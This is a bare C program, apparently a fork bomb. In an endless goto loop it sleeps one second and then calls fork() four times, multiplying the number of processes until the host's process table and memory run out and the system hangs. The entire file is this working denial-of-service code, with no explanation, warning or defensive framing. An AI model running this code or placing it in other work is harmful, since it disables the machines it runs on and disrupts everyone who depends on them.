
#include <unistd.h>
int main(int argc, char *argv[])
{
start:
    sleep(1);
    fork();
    fork();
    fork();
    fork();
    goto start;
}
